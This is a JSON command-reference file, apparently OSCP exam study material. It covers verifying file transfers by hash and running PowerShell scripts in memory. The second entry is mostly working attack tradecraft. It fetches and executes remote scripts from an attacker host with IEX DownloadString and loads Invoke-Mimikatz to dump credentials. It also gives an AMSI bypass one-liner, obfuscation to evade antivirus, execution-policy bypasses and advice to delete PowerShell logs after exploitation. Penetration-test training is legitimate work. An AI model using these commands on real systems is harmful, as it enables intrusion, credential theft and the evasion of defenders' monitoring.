{
  "metadata": {
    "file_purpose": "File transfer verification and in-memory execution - ensuring file integrity after transfer and evading disk-based detection",
    "oscp_relevance": "CRITICAL for OSCP. After transferring exploits/tools to target, ALWAYS verify file integrity. Corrupted transfers cause silent failures and waste exam time."
  },
  "commands": [
    {
      "id": "ft-file-verify-md5",
      "name": "Verify File Transfer with MD5 Hash",
      "category": "file-transfer",
      "subcategory": "verification",
      "command": "md5sum <FILE>",
      "description": "Calculate MD5 hash of transferred file to verify integrity. Compare with original hash from Kali to ensure successful transfer. ALWAYS verify after file transfer to avoid corrupted payloads.",
      "variables": [
        {
          "name": "<FILE>",
          "description": "Filename to verify",
          "example": "LinEnum.sh",
          "required": true
        }
      ],
      "flag_explanations": {
        "md5sum": "Calculate MD5 (Message Digest 5) hash of file contents. Produces 32-character hexadecimal fingerprint. Same file = same MD5. Even 1-byte difference = completely different hash. CRITICAL FOR OSCP: Verify exploits/scripts transferred correctly before execution. Corrupted binaries waste precious exam time with cryptic errors.",
        "Windows equivalent": "Get-FileHash -Algorithm MD5 <FILE> | Select-Object -ExpandProperty Hash (PowerShell). Or certutil -hashfile <FILE> MD5 (older Windows). Both produce same 32-hex MD5 as Linux md5sum.",
        "<FILE>": "File to verify. Can be absolute or relative path. Examples: ./exploit.sh, /tmp/nc.exe, C:\\Windows\\Temp\\payload.exe"
      },
      "success_indicators": [
        "Output: 32 hex characters followed by filename",
        "Example: 5d41402abc4b2a76b9719d911017c592 LinEnum.sh",
        "Hash matches original from Kali",
        "No 'No such file' errors"
      ],
      "failure_indicators": [
        "md5sum: <FILE>: No such file or directory",
        "Permission denied",
        "Different hash than original (indicates corruption)"
      ],
      "troubleshooting": {
        "Hash mismatch (corruption detected)": "File corrupted during transfer. Solution: (1) Delete corrupted file: rm <FILE>, (2) Re-transfer using different method (try SMB if HTTP failed, or vice versa), (3) Verify Kali source file not corrupted: md5sum /opt/tools/<FILE>. Common causes: Text mode transfer for binary files, incomplete transfer (connection dropped), encoding issues (Windows CRLF vs Linux LF).",
        "No such file or directory": "File path wrong or transfer failed silently. Solution: List files: ls -la (Linux) or dir (Windows). Check current directory: pwd (Linux) or cd (Windows). Verify upload completed: check file size matches original.",
        "Permission denied": "Cannot read file. Solution: Check permissions: ls -l <FILE>. If owned by root: sudo md5sum <FILE>. Or change permissions: chmod 644 <FILE>.",
        "md5sum command not found (rare on Linux)": "md5sum missing (unusual - part of coreutils). Alternative: sha256sum <FILE> (compare with sha256sum on Kali). Or install: apt install coreutils.",
        "Windows: Get-FileHash not available (old PowerShell)": "Use certutil instead: certutil -hashfile <FILE> MD5. Or upload md5.exe: copy \\\\<LHOST>\\share\\md5.exe . && md5.exe <FILE>"
      },
      "prerequisites": [],
      "next_steps": [],
      "alternatives": [
        "sha256sum <FILE> (SHA-256, more secure but slower)",
        "Get-FileHash <FILE> (PowerShell on Windows)",
        "certutil -hashfile <FILE> MD5 (Windows built-in)"
      ],
      "tags": [
        "FILE_TRANSFER",
        "VERIFICATION",
        "MD5",
        "LINUX",
        "WINDOWS",
        "OSCP:HIGH"
      ],
      "oscp_relevance": "high",
      "notes": "ALWAYS VERIFY after file transfer. OSCP WORKFLOW: (1) Calculate hash on Kali: md5sum /opt/tools/LinEnum.sh, (2) Transfer file to target, (3) Calculate hash on target: md5sum LinEnum.sh, (4) Compare hashes - must match exactly. COMMON CORRUPTION CAUSES: FTP text mode for binary files, incomplete wget (connection interrupted), copy/paste corruption (terminal encoding issues). Time estimate: <1 second per file. EXAM TIP: Create quick verification script: for f in *.exe; do echo \"$f:\"; md5sum \"$f\"; done\n\nMANUAL ALTERNATIVES:\n\nLinux MD5 verification:\nmd5sum <FILE>\n# Compare output with original: md5sum /opt/tools/<FILE>\n\nWindows PowerShell verification:\nGet-FileHash -Algorithm MD5 <FILE> | Select-Object -ExpandProperty Hash\n# Compare with: Get-FileHash -Algorithm MD5 \\\\<KALI>\\share\\<FILE>\n\nWindows certutil verification:\ncertutil -hashfile <FILE> MD5\n# Output includes extra text - ignore CertUtil header/footer\n\nBatch verify multiple files (Linux):\nmd5sum exploit.sh nc.exe LinEnum.sh > hashes.txt\n# On Kali, create matching file:\nmd5sum /opt/tools/exploit.sh /opt/tools/nc.exe /opt/tools/LinEnum.sh > original_hashes.txt\n# Compare: diff hashes.txt original_hashes.txt (no output = perfect match)\n\nSHA-256 (more secure, slower):\nsha256sum <FILE>\n# Use when MD5 collision attacks are concern (rare in OSCP)\n\nQuick file size check (faster than hash):\nls -lh <FILE> (Linux)\ndir <FILE> (Windows)\n# Compare size with original - not foolproof but catches most corruption\n\nAutomate verification:\n#!/bin/bash\n# verify.sh - Compare file against known hash\nFILE=$1\nEXPECTED_HASH=$2\nACTUAL_HASH=$(md5sum \"$FILE\" | cut -d' ' -f1)\nif [ \"$ACTUAL_HASH\" = \"$EXPECTED_HASH\" ]; then\n    echo \"[+] $FILE: VERIFIED\"\nelse\n    echo \"[-] $FILE: CORRUPTED (expected $EXPECTED_HASH, got $ACTUAL_HASH)\"\n    exit 1\nfi\n\nUSAGE:\n./verify.sh LinEnum.sh 5d41402abc4b2a76b9719d911017c592\n\nCORRUPTION TROUBLESHOOTING:\n\nBinary file transferred in text mode:\n# Symptoms: Hash mismatch, executable fails with \"cannot execute binary file\"\n# Solution: Use binary mode transfer\nwget --content-disposition http://<LHOST>/nc.exe (HTTP auto-detects)\nsmbget -U '' smb://<LHOST>/share/nc.exe (SMB always binary)\nftp> binary; get nc.exe (FTP manual binary mode)\n\nLine ending corruption (scripts):\n# Symptoms: Hash mismatch on .sh/.py files, \"^M\" characters, \"bad interpreter\"\n# Solution: Convert line endings\ndos2unix exploit.sh (Linux)\n sed -i 's/\\r$//' exploit.sh (alternative)\n\nIncomplete transfer:\n# Symptoms: File size smaller than original, hash mismatch\n# Solution: Check file size first\nls -lh <FILE> (should match original exactly)\n# If smaller, re-download\n\nEncoding corruption (copy/paste):\n# Symptoms: Text files work but binaries fail\n# Solution: NEVER copy/paste binary files - use proper transfer method\n\nWHEN TO USE EACH HASH:\nMD5: Fast, sufficient for OSCP transfer verification\nSHA-1: Medium speed, more secure than MD5\nSHA-256: Slower, most secure, use for critical payloads\n\nTIME ESTIMATE:\nMD5 calculation: <1 second for files <100MB\nSHA-256: 2-3x slower than MD5\nFile size check only: <0.1 second (quick but less reliable)"
    },
    {
      "id": "ft-powershell-execute-memory",
      "name": "Execute PowerShell Script from Memory",
      "category": "file-transfer",
      "subcategory": "in-memory-execution",
      "command": "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>.ps1')",
      "description": "Download and execute PowerShell script directly in memory without touching disk. Bypasses file-based AV detection and leaves minimal forensic artifacts. OPSEC-friendly payload delivery.",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address hosting the PowerShell script",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<SCRIPT>",
          "description": "PowerShell script filename (without .ps1 or with .ps1)",
          "example": "Invoke-Mimikatz",
          "required": true
        }
      ],
      "flag_explanations": {
        "IEX": "Invoke-Expression cmdlet - executes string as PowerShell code. Alias for Invoke-Expression. CRITICAL: Downloaded script runs directly in memory, never written to disk. OPSEC ADVANTAGE: No file I/O events (Event ID 4663), no AV file scan, no forensic disk artifacts. DISADVANTAGE: Logged in PowerShell transcription/module logging if enabled.",
        "New-Object Net.WebClient": "Creates .NET WebClient object for HTTP operations. ALTERNATIVE: Invoke-WebRequest (IWR) is newer but more logged. WebClient is stealthier - generates less ETW telemetry. Works on PowerShell 2.0+ (including old Windows 7/2008).",
        ".DownloadString()": "Downloads file as string (text). Returns content directly to memory. CRITICAL: Use DownloadString for scripts (.ps1), NOT DownloadFile (which writes to disk). DownloadString keeps payload in RAM only.",
        "http://<LHOST>/<SCRIPT>.ps1": "URL of PowerShell script on attacker's web server. OSCP SETUP: Start HTTP server on Kali: python3 -m http.server 80. Place script in web root: /var/www/html/ or current directory. URL example: http://10.10.14.5/Invoke-Mimikatz.ps1"
      },
      "success_indicators": [
        "Script downloads and executes immediately",
        "No file appears in current directory (ls shows no new .ps1 file)",
        "Script output/results displayed in PowerShell console",
        "Example: Mimikatz output, PowerUp vulnerabilities, etc.",
        "No AV alerts (if script is AV-evading)"
      ],
      "failure_indicators": [
        "The term 'IEX' is not recognized",
        "Access to the path is denied",
        "Unable to connect to the remote server",
        "(407) Proxy Authentication Required",
        "Execution Policy prevents script execution"
      ],
      "troubleshooting": {
        "Execution Policy blocks script": "PowerShell Execution Policy restricting IEX. Solution: Bypass policy: powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>.ps1')\". Or set policy: Set-ExecutionPolicy Bypass -Scope Process -Force (temporary, current session only).",
        "Unable to connect to remote server": "Target cannot reach Kali HTTP server. Solution: Verify web server running: ss -ntlp | grep :80 (on Kali). Test connectivity: curl http://<LHOST> (from target). Check firewall: sudo ufw allow 80/tcp (Kali). Verify correct LHOST IP: ip addr show tun0. Try alternate port: python3 -m http.server 8080 (change URL to :8080).",
        "Proxy Authentication Required (407)": "Corporate proxy blocking outbound HTTP. Solution: Bypass proxy: (New-Object Net.WebClient).Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<SCRIPT>.ps1'). Or use SMB instead of HTTP: IEX (Get-Content \\\\<LHOST>\\share\\script.ps1 -Raw).",
        "Script downloads but doesn't execute": "Syntax error or script expecting parameters. Solution: Test script locally first: IEX (Get-Content C:\\script.ps1 -Raw). Check for required parameters: Get-Help Invoke-Script. Pass parameters: IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'); Invoke-Function -Param value.",
        "AV blocks download": "AV signatures in HTTP traffic or script content. Solution: (1) Obfuscate script: Invoke-Obfuscation, (2) Use HTTPS: python3 -m http.server --ssl, (3) Encode script: $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'))); IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))). (4) Use alternate delivery: SMB, DNS tunneling, etc.",
        "IEX not recognized (PowerShell 1.0)": "Ancient PowerShell version. Solution: Use full cmdlet name: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'). Or upgrade PowerShell (if possible)."
      },
      "prerequisites": [],
      "next_steps": [],
      "alternatives": [
        "IWR -Uri http://<LHOST>/<SCRIPT>.ps1 -UseBasicParsing | IEX (PowerShell 3.0+)",
        "(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1') | IEX (explicit pipe)",
        "IEX (Get-Content \\\\<LHOST>\\share\\script.ps1 -Raw) (SMB-based)"
      ],
      "tags": [
        "POWERSHELL",
        "IN_MEMORY_EXECUTION",
        "FILE_TRANSFER",
        "AV_EVASION",
        "WINDOWS",
        "OSCP:HIGH",
        "OPSEC"
      ],
      "oscp_relevance": "high",
      "notes": "STEALTHIEST PowerShell payload delivery. No disk writes = no file-based AV scan, no disk forensics. OSCP USE CASES: Invoke-Mimikatz, PowerUp, Invoke-Kerberoast, custom enumeration scripts. OPSEC ADVANTAGES: (1) No file I/O events, (2) No AV file scan trigger, (3) No forensic artifacts on disk, (4) Faster than download + execute. DISADVANTAGES: (1) PowerShell module/transcription logging still captures (if enabled), (2) Network traffic visible (HTTP GET logged), (3) Script stays in PowerShell process memory (detectable by memory scanners). Time estimate: 1-5 seconds (depends on script size and network speed).\n\nMANUAL ALTERNATIVES:\n\nBasic in-memory execution:\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')\n\nWith ExecutionPolicy bypass:\npowershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')\"\n\nWith proxy credentials:\n$wc = New-Object Net.WebClient\n$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials\nIEX $wc.DownloadString('http://<LHOST>/script.ps1')\n\nHTTPS (encrypted traffic):\nIEX (New-Object Net.WebClient).DownloadString('https://<LHOST>/script.ps1')\n# Requires Kali HTTPS server: python3 -m http.server 443 --ssl\n\nSMB-based (no HTTP server needed):\nIEX (Get-Content \\\\<LHOST>\\share\\script.ps1 -Raw)\n# Kali SMB server: smbserver.py share /opt/scripts/ -smb2support\n\nExecute with parameters:\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1'); Invoke-Mimikatz -DumpCreds\n\nEncoded/obfuscated (bypass AV signatures):\n$s=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://<LHOST>/encoded.txt')))\nIEX $s\n\nOne-liner with shorter alias:\niex (iwr -Uri http://<LHOST>/script.ps1 -UseBasicParsing).Content\n# iex = IEX, iwr = Invoke-WebRequest\n\nMultiple scripts chained:\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerUp.ps1')\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')\nInvoke-AllChecks; Invoke-Mimikatz -DumpCreds\n\nDownload once, execute multiple times:\n$script = (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')\nIEX $script # First execution\nIEX $script # Second execution (no re-download)\n\nKALI HTTP SERVER SETUP:\n\nPython HTTP server (simple):\ncd /opt/powershell-scripts/\npython3 -m http.server 80\n# Access: http://<LHOST>/Invoke-Mimikatz.ps1\n\nApache (persistent):\nsudo cp Invoke-Mimikatz.ps1 /var/www/html/\nsudo systemctl start apache2\n# Access: http://<LHOST>/Invoke-Mimikatz.ps1\n\nHTTPS server (encrypted):\n# Generate self-signed cert\nopenssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes\npython3 -m http.server 443 --ssl\n# PowerShell ignores cert errors by default for DownloadString\n\nCOMMON POWERSHELL SCRIPTS FOR IN-MEMORY EXECUTION:\n\n1. Invoke-Mimikatz (credential dumping):\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1')\nInvoke-Mimikatz -DumpCreds\n\n2. PowerUp (privilege escalation enumeration):\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')\nInvoke-AllChecks\n\n3. Invoke-Kerberoast (Kerberoasting):\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Kerberoast.ps1')\nInvoke-Kerberoast -OutputFormat Hashcat | fl\n\n4. Invoke-BloodHound (AD enumeration):\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/SharpHound.ps1')\nInvoke-BloodHound -CollectionMethod All\n\n5. PowerView (AD reconnaissance):\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerView.ps1')\nGet-NetUser; Get-NetGroup\n\nDETECTION EVASION:\n\nObfuscate URL:\n$url = 'http://' + '10.10.14.5' + '/script.ps1'\nIEX (New-Object Net.WebClient).DownloadString($url)\n\nObfuscate WebClient:\n$wc = [Activator]::CreateInstance([Type]::GetTypeFromProgID('MSXML2.ServerXMLHTTP'))\n$wc.open('GET', 'http://<LHOST>/script.ps1', $false)\n$wc.send()\nIEX $wc.responseText\n\nBypass AMSI (Antimalware Scan Interface):\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nIEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')\n\nOPSEC CONSIDERATIONS:\n- Event ID 4688 (process creation) logs powershell.exe\n- Event ID 3 (network connection) logs HTTP GET to Kali\n- PowerShell module logging captures IEX command (if enabled)\n- PowerShell transcription logs script content (if enabled)\n- AMSI may scan downloaded string before execution\n- Defenders monitor for: IEX, Net.WebClient, DownloadString in command line\n\nMITIGATIONS:\n- Use encoded Base64 commands to hide IEX from process arguments\n- Use HTTPS to encrypt network traffic\n- Obfuscate script content to evade AMSI\n- Delete PowerShell logs post-exploitation (if possible)\n- Use alternate protocols (SMB, DNS tunneling)\n\nTIME ESTIMATE:\nScript download: 1-5 seconds (depends on size and connection)\nScript execution: Variable (depends on script)\nTotal: 2-10 seconds for typical scripts"
    }
  ]
}
